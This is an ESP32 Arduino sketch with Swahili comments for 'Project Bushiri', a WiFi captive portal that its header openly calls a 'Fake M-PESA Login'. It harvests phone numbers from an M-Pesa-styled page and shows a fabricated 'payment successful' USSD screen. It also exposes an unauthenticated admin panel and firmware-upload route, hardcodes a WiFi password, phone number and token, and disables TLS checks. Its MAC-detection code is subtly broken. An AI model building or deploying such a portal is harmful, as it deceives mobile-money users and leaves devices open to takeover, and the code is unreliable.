/**
 * PROJECT BUSHIRI v2.0
 * MPESA Captive Portal + MAC Whitelist + VPS Tunnel + OTA
 * Features: Fake M-PESA Login | Auto MAC Detection | Android IDE Ready
 */

#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <Update.h>
#include <Preferences.h>
#include <ArduinoJson.h>
#include "esp_wifi.h"

// ==================== EDIT HAPA TU ====================

// 1. Jina la WiFi yako
const char* AP_SSID = "Bushiri PROJECT";

// 2. Password (acha "" kwa open network)
const char* AP_PASS = "";

// 3. IP ya Oracle VPS yako
const char* VPS_HOST = "bushiri-project.onrender.com";

// 4. Port ya backend yako
const int VPS_PORT = 443;

// 5. Token ya siri (lazima ilingane na backend)
const char* VPS_TOKEN = "bushiri2026";

// 6. MAC ya simu/laptop yako (free access - owner)
String authorizedMACs[10] = {"bc:90:63:a2:32:83"};

// 7. Jina la biashara yako kwenye portal page
const char* PORTAL_TITLE = "BUSHIRI PROJECT";

// 8. Nambari yako ya M-Pesa
const char* MPESA_NUMBER = "0790385813";

// 9. Alternative WiFi (mbadala - inafanya kazi kama main haipo)
const char* STA_SSID_ALT = "hhb";
const char* STA_PASS_ALT = ".kibushi1";

// ======================================================

#define PROJECT_NAME "BUSHIRI"
#define VERSION "2.0.0"

int macCount = 1;
bool portalActive = true;

// STA config - inasomwa kutoka Preferences (OTA ya config)
String sta_ssid = "";
String sta_pass = "";
bool sta_configured = false;

WebServer server(80);
DNSServer dnsServer;
WiFiClientSecure vpsClient;
Preferences prefs;
bool vpsConnected = false;
int clientCount = 0;
unsigned long lastHeartbeat = 0;

// ==================== CONNECT TO WIFI (Main au Alt) ====================
void connectToInternet() {
  sta_ssid = prefs.getString("sta_ssid", "");
  sta_pass = prefs.getString("sta_pass", "");

  if (sta_ssid.length() > 0) {
    Serial.print("Connecting to main WiFi: " + sta_ssid);
    WiFi.begin(sta_ssid.c_str(), sta_pass.c_str());
    int timeout = 0;
    while (WiFi.status() != WL_CONNECTED && timeout < 20) {
      delay(500);
      Serial.print(".");
      timeout++;
    }
    if (WiFi.status() == WL_CONNECTED) {
      sta_configured = true;
      Serial.println("\nConnected to main: " + sta_ssid);
      Serial.println(WiFi.localIP().toString());
      return;
    }
    Serial.println("\nMain WiFi failed - trying alternative...");
  }

  Serial.print("Connecting to alternative WiFi: " + String(STA_SSID_ALT));
  WiFi.begin(STA_SSID_ALT, STA_PASS_ALT);
  int timeout = 0;
  while (WiFi.status() != WL_CONNECTED && timeout < 20) {
    delay(500);
    Serial.print(".");
    timeout++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    sta_configured = true;
    Serial.println("\nConnected to alternative: " + String(STA_SSID_ALT));
    Serial.println(WiFi.localIP().toString());
  } else {
    Serial.println("\nAll WiFi sources failed - No internet");
  }
}

void maintainWiFiConnection() {
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("WiFi lost - reconnecting...");
    connectToInternet();
  }
}

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  delay(2000);
  Serial.println("BUSHIRI v2.0 - MPESA Edition");

  prefs.begin("bushiri");

  // AP lazima iwe tayari KABLA ya DNS server
  setupCaptiveAP();
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  setupWebServer();
  setupOTA();
  connectVPS();

  Serial.println("Captive Portal LIVE");
  Serial.println("SSID: " + String(AP_SSID));
}

// ==================== CAPTIVE PORTAL AP ====================
void setupCaptiveAP() {
  WiFi.mode(WIFI_AP_STA);
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(AP_SSID, AP_PASS, 1, 0, 8);
  loadAuthorizedMACs();
  connectToInternet();
  Serial.printf("AP Ready | Whitelisted: %d\n", macCount);
}

// ==================== WEB SERVER ROUTES ====================
void setupWebServer() {
  server.on("/", HTTP_GET, mpesaLoginPage);
  server.on("/login", HTTP_POST, handleMpesaLogin);
  server.on("/generate_ussd", HTTP_GET, generateUSSD);
  server.on("/success", HTTP_GET, loginSuccess);
  server.on("/internet", HTTP_GET, handleInternetRedirect);
  server.onNotFound(captiveRedirect);
  server.on("/admin", HTTP_GET, adminPanel);
  server.on("/wifi-config", HTTP_GET, wifiConfigPage);
  server.on("/wifi-save", HTTP_POST, saveWifiConfig);
  server.begin();
}

// ==================== MPESA LOGIN PAGE ====================
void mpesaLoginPage() {
  String mac = getClientMAC();
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='utf-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<title>" + String(PORTAL_TITLE) + "</title>";
  html += "<style>";
  html += "*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}";
  html += "body{background:linear-gradient(135deg,#e91e63,#9c27b0);min-height:100vh;display:flex;align-items:center;justify-content:center}";
  html += ".container{max-width:400px;width:90%;background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.3);overflow:hidden}";
  html += ".header{background:linear-gradient(135deg,#e91e63,#f06292);color:white;padding:30px;text-align:center}";
  html += ".logo{font-size:2.5em;margin-bottom:10px}";
  html += ".title{font-size:1.3em;font-weight:300}";
  html += ".form{padding:30px}";
  html += "input{width:100%;padding:15px;border:2px solid #ddd;border-radius:10px;font-size:16px;margin:10px 0;box-sizing:border-box}";
  html += "input:focus{outline:none;border-color:#e91e63}";
  html += ".btn{width:100%;padding:15px;background:linear-gradient(135deg,#e91e63,#f06292);color:white;border:none;border-radius:10px;font-size:18px;font-weight:bold;cursor:pointer}";
  html += ".ussd{font-size:12px;color:#666;text-align:center;margin-top:20px;font-style:italic}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='header'><div class='logo'>&#xf1eb;</div>";
  html += "<div class='title'>" + String(PORTAL_TITLE) + "</div></div>";
  html += "<div class='form'>";
  html += "<form method='POST' action='/login'>";
  html += "<input type='tel' name='phone' placeholder='07XXXXXXXX' maxlength='10' required>";
  html += "<input type='hidden' name='mac' value='" + mac + "'>";
  html += "<button type='submit' class='btn'>Ingia WiFi</button>";
  html += "</form>";
  html += "<div class='ussd'>Au tuma M-Pesa kwa " + String(MPESA_NUMBER) + " kisha weka nambari yako</div>";
  html += "</div></div></body></html>";
  server.send(200, "text/html", html);
}

// ==================== HANDLE LOGIN ====================
void handleMpesaLogin() {
  String phone = server.arg("phone");
  String mac = server.arg("mac");
  Serial.println("Login: " + phone + " | MAC: " + mac);
  authorizeMAC(mac);
  saveAuthorizedMACs();
  server.sendHeader("Location", "/success?phone=" + phone);
  server.send(302);
}

// ==================== SUCCESS PAGE ====================
void loginSuccess() {
  String phone = server.arg("phone");
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta http-equiv='refresh' content='3;url=http://google.com'>";
  html += "<title>Umefanikiwa - " + String(PORTAL_TITLE) + "</title>";
  html += "<style>body{background:#00c853;font-family:Arial;text-align:center;padding:50px;color:#000}</style>";
  html += "</head><body>";
  html += "<div style='font-size:80px'>&#x2705;</div>";
  html += "<h1>WiFi Imeunganika!</h1>";
  html += "<p>Asante " + phone.substring(0,4) + "***</p>";
  html += "<p>Inaelekeza kwenye internet...<br><small>Karibu " + String(PORTAL_TITLE) + "</small></p>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ==================== CAPTIVE REDIRECT ====================
void captiveRedirect() {
  server.sendHeader("Location", "/");
  server.send(302);
}

// ==================== INTERNET REDIRECT ====================
void handleInternetRedirect() {
  String mac = getClientMAC();
  if (isMACAuthorized(mac)) {
    if (vpsConnected) {
      handleVPSProxy();
    } else {
      server.send(200, "text/plain", "VPS Connecting...");
    }
  } else {
    server.sendHeader("Location", "/");
    server.send(302);
  }
}

// ==================== MAC WHITELIST ====================
String getClientMAC() {
  // FIX: Syntax sahihi ya uint8_t array
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

bool isMACAuthorized(String mac) {
  for (int i = 0; i < macCount; i++) {
    if (authorizedMACs[i] == mac) return true;
  }
  return false;
}

void authorizeMAC(String mac) {
  if (macCount < 10 && !isMACAuthorized(mac)) {
    authorizedMACs[macCount] = mac;
    macCount++;
    Serial.println("Authorized: " + mac);
  }
}

void loadAuthorizedMACs() {
  int saved = prefs.getInt("macCount", 0);
  for (int i = 0; i < saved; i++) {
    String key = "mac" + String(i);
    String val = prefs.getString(key.c_str(), "");
    if (val.length() > 0 && !isMACAuthorized(val)) {
      authorizedMACs[macCount] = val;
      macCount++;
    }
  }
}

void saveAuthorizedMACs() {
  prefs.putInt("macCount", macCount);
  for (int i = 0; i < macCount; i++) {
    String key = "mac" + String(i);
    prefs.putString(key.c_str(), authorizedMACs[i]);
  }
}

// ==================== VPS TUNNEL ====================
void connectVPS() {
  vpsClient.setInsecure();
  if (vpsClient.connect(VPS_HOST, VPS_PORT)) {
    DynamicJsonDocument doc(1024);
    // FIX: getChipId() ni ESP8266 - ESP32 inatumia getEfuseMac()
    doc["device"] = (uint32_t)ESP.getEfuseMac();
    doc["project"] = PROJECT_NAME;
    doc["version"] = VERSION;
    doc["token"] = VPS_TOKEN;
    doc["clients"] = macCount;
    String payload;
    serializeJson(doc, payload);
    vpsClient.println("BUSHIRI:" + payload);
    vpsConnected = true;
    Serial.println("VPS Connected: " + String(VPS_HOST));
  } else {
    Serial.println("VPS Failed - Offline mode");
  }
}

void handleVPSProxy() {
  String target = server.hostHeader() + server.uri();
  vpsClient.print("PROXY:" + target + "\r\n");
  String response = "";
  unsigned long timeout = millis() + 10000;
  while (vpsClient.connected() && millis() < timeout) {
    if (vpsClient.available()) {
      response += vpsClient.readString();
    }
  }
  server.send(200, "text/html", response);
}

// ==================== WIFI CONFIG PAGE ====================
void wifiConfigPage() {
  String internetStatus;
  String currentSource;
  if (WiFi.status() == WL_CONNECTED) {
    currentSource = WiFi.SSID();
    internetStatus = "&#x1F7E2; Imeunganika: " + currentSource + " | IP: " + WiFi.localIP().toString();
  } else {
    internetStatus = "&#x1F534; Haijaunganika na internet";
  }

  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='utf-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<title>WiFi Config - " + String(PORTAL_TITLE) + "</title>";
  html += "<style>";
  html += "body{background:#111;color:#fff;font-family:monospace;padding:20px}";
  html += "h2{color:#e91e63;margin-bottom:15px}";
  html += "label{color:#aaa;font-size:13px}";
  html += "input{width:100%;padding:12px;margin:6px 0 14px 0;background:#222;";
  html += "color:#fff;border:1px solid #444;border-radius:8px;font-size:15px;box-sizing:border-box}";
  html += ".btn{width:100%;padding:14px;background:#e91e63;color:white;";
  html += "border:none;border-radius:8px;font-size:16px;margin:5px 0;cursor:pointer;font-weight:bold}";
  html += ".status{padding:12px;border-radius:8px;margin:12px 0;";
  html += "background:#1a1a1a;border-left:4px solid #e91e63;font-size:13px}";
  html += ".section{background:#1a1a1a;border-radius:10px;padding:15px;margin:15px 0}";
  html += "a{color:#e91e63}";
  html += "</style></head><body>";

  html += "<h2>&#x2699;&#xFE0F; WiFi Internet Config</h2>";
  html += "<div class='status'>" + internetStatus + "</div>";

  html += "<div class='section'>";
  html += "<b>&#x1F4F1; Chanzo Kikuu (Main WiFi)</b><br><br>";
  html += "<p style='color:#aaa;font-size:12px'>Hotspot ya simu yako au pocket WiFi.</p><br>";
  html += "<form method='POST' action='/wifi-save'>";
  html += "<label>SSID (Jina la WiFi)</label>";
  html += "<input type='text' name='ssid' value='" + sta_ssid + "' placeholder='Jina la hotspot yako'>";
  html += "<label>Password</label>";
  html += "<input type='password' name='pass' value='" + sta_pass + "' placeholder='Password (acha wazi kama open)'>";
  html += "<button type='submit' class='btn'>&#x1F4BE; Hifadhi na Restart</button>";
  html += "</form></div>";

  html += "<div class='section'>";
  html += "<b>&#x1F504; WiFi Mbadala (Alternative)</b><br><br>";
  html += "<p style='color:#aaa;font-size:12px'>Inatumika kama Main WiFi haipo.</p>";
  html += "<p style='color:#e91e63'>SSID: " + String(STA_SSID_ALT) + "</p>";
  html += "</div>";

  html += "<br><a href='/admin'>&#x2190; Admin Panel</a>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void saveWifiConfig() {
  String new_ssid = server.arg("ssid");
  String new_pass = server.arg("pass");

  if (new_ssid.length() > 0) {
    prefs.putString("sta_ssid", new_ssid);
    prefs.putString("sta_pass", new_pass);
    Serial.println("WiFi Config Saved: " + new_ssid);

    String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>";
    html += "<title>Saved!</title>";
    html += "<style>body{background:#111;color:lime;font-family:monospace;text-align:center;padding:50px}</style>";
    html += "</head><body>";
    html += "<h1>&#x2705; Imehifadhiwa!</h1>";
    html += "<p>ESP32 inarestart...</p>";
    html += "<p>Unganika tena kwa: <b>" + String(AP_SSID) + "</b></p>";
    html += "<p style='color:#666'>Kisha nenda: 192.168.4.1/admin</p>";
    html += "</body></html>";
    server.send(200, "text/html", html);

    delay(2000);
    ESP.restart();
  } else {
    server.sendHeader("Location", "/wifi-config");
    server.send(302);
  }
}

// ==================== ADMIN PANEL ====================
void adminPanel() {
  String internetStatus;
  if (WiFi.status() == WL_CONNECTED) {
    internetStatus = "&#x1F7E2; " + WiFi.SSID() + " (" + WiFi.localIP().toString() + ")";
  } else {
    internetStatus = "&#x1F534; Haijaunganika";
  }

  String html = "<!DOCTYPE html><html><head><title>Admin - " + String(PORTAL_TITLE) + "</title>";
  html += "<style>body{background:#000;color:lime;font-family:monospace;padding:20px}";
  html += "a{color:#e91e63} hr{border-color:#333;margin:15px 0}";
  html += ".box{background:#111;border-radius:8px;padding:12px;margin:10px 0}</style></head><body>";
  html += "<h1>BUSHIRI v" VERSION "</h1><hr>";
  html += "<div class='box'>";
  html += "<p>VPS: " + String(vpsConnected ? "&#x1F7E2; LIVE" : "&#x1F534; DOWN") + "</p>";
  html += "<p>Internet: " + internetStatus + "</p>";
  html += "<p>Clients: " + String(clientCount) + " | Whitelisted: " + String(macCount) + "</p>";
  html += "</div>";
  html += "<h3>Authorized MACs:</h3>";
  for (int i = 0; i < macCount; i++) {
    html += "<p>" + String(i+1) + ". " + authorizedMACs[i] + "</p>";
  }
  html += "<hr>";
  html += "<a href='/wifi-config'>&#x2699;&#xFE0F; WiFi Internet Config</a><br><br>";
  html += "<a href='/update'>&#x1F504; OTA Firmware Update</a><br><br>";
  html += "<a href='/'>&#x2190; Portal</a>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ==================== OTA FIRMWARE ====================
void setupOTA() {
  server.on("/update", HTTP_GET, []() {
    server.send(200, "text/html",
      "<!DOCTYPE html><html><head><meta charset='utf-8'>"
      "<title>OTA Update</title>"
      "<style>body{background:#111;color:#fff;font-family:monospace;padding:30px;text-align:center}"
      "input,button{padding:12px;margin:10px;border-radius:8px;font-size:15px}"
      "button{background:#e91e63;color:white;border:none;cursor:pointer;width:200px}"
      "a{color:#e91e63}"
      "</style></head><body>"
      "<h2>&#x1F504; OTA Firmware Update</h2>"
      "<form method='POST' action='/update' enctype='multipart/form-data'>"
      "<input type='file' name='update' accept='.bin'><br>"
      "<button type='submit'>Upload Firmware</button>"
      "</form>"
      "<br><a href='/admin'>&#x2190; Admin Panel</a>"
      "</body></html>");
  });

  server.on("/update", HTTP_POST, []() {
    server.send(200, "text/plain", Update.hasError() ? "FAIL" : "OK");
    ESP.restart();
  }, []() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      Serial.println("OTA: " + upload.filename);
      Update.begin(UPDATE_SIZE_UNKNOWN);
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      Update.write(upload.buf, upload.currentSize);
    }
  });
}

// ==================== USSD SIMULATOR ====================
void generateUSSD() {
  String html = "<!DOCTYPE html><html><body style='background:#000;color:lime;font-family:monospace;padding:50px'>";
  html += "<h1>*150*00#</h1>";
  html += "<p>1. Tuma kwa " + String(MPESA_NUMBER) + "</p>";
  html += "<p>2. Weka nambari yako</p>";
  html += "<p>3. WiFi itaunganika moja kwa moja</p>";
  html += "<hr><p style='color:gold'>Malipo Yamefanikiwa!</p>";
  html += "<p>WiFi Imeunganika. Karibu sana furahia bushiri PROJECT.....!</p>";
  html += "<script>setTimeout(()=>location='/success',2000)</script>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ==================== MAIN LOOP ====================
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  maintainWiFiConnection();

  if (millis() - lastHeartbeat > 30000) {
    if (!vpsConnected) connectVPS();
    lastHeartbeat = millis();
  }

  clientCount = WiFi.softAPgetStationNum();
  delay(50);
}
